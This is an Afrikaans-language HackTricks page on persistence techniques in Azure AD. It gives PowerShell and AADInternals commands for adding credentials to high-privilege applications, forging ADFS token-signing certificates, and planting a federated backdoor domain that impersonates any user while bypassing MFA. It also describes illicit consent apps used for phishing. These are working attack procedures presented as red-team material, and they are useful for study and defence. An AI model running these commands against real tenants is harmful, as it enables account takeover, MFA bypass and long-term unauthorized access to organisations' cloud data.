# Az - Volharding

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Onwettige Toestemming Verleen

Standaard kan enige gebruiker 'n aansoek registreer in Azure AD. Jy kan dus 'n aansoek registreer (slegs vir die teikenhuurder) wat ho√´ impak-toestemmings benodig met administratiewe toestemming (en dit goedkeur as jy die administrateur is) - soos e-pos stuur namens 'n gebruiker, rolbestuur ens. Dit sal ons in staat stel om **phishing-aanvalle** uit te voer wat baie **vrugbaar** sou wees in geval van sukses.

Verder kan jy ook daardie aansoek met jou gebruiker aanvaar as 'n manier om toegang daartoe te behou.

### Aansoeke en Diensbeginsels

Met die voorregte van 'n Aansoekadministrateur, GA of 'n aangepaste rol met microsoft.directory/aansoeke/credentials/update-toestemmings, kan ons geloofsbriewe (geheim of sertifikaat) by 'n bestaande aansoek voeg.

Dit is moontlik om **'n aansoek met ho√´ toestemmings te teiken** of **'n nuwe aansoek met ho√´ toestemmings by te voeg**.

'n Interessante rol om by die aansoek te voeg, sou die **Bevoorregte verifikasie-administrateurrol** wees, omdat dit die **wagwoord kan herstel** van Globale Administrateurs.

Hierdie tegniek maak dit ook moontlik om **MFA te omseil**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Vir sertifikaat-gebaseerde verifikasie

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federasie - Token Ondertekening Sertifikaat

Met **DA-voorregte** op die on-prem AD, is dit moontlik om **nuwe Token ondertekening** en **Token Dekripteer sertifikate** te skep en in te voer wat 'n baie lang geldigheid het. Dit sal ons in staat stel om as enige gebruiker in te teken waarvan ons die ImuutableID ken.

**Voer** die onderstaande bevel uit as **DA op die ADFS-bediener(s)** om nuwe sertifikate te skep (standaard wagwoord 'AADInternals'), voeg hulle by ADFS, deaktiveer outomatiese rollover en herlaai die diens:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Vervolgens, werk die sertifikaatinligting by met Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasie - Vertroude Domein

Met GA-voorregte op 'n huurder is dit moontlik om 'n nuwe domein by te voeg (moet geverifieer word), sy outentiseringstipe te konfigureer na Federated en die domein te konfigureer om 'n spesifieke sertifikaat (enige.sts in die onderstaande bevel) en uitreiker te vertrou:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Verwysings

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
